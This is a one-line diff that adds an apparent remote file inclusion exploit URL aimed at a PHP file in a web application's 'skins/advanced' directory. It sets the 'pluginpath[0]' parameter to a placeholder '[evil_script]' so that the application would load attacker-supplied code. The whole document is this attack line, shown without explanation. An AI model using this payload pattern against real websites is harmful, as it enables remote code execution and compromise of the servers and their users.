@@ -1,0 +1,1 @@
+http://www.example.com/skins/advanced/advanced1.php?pluginpath[0]=[evil_script]
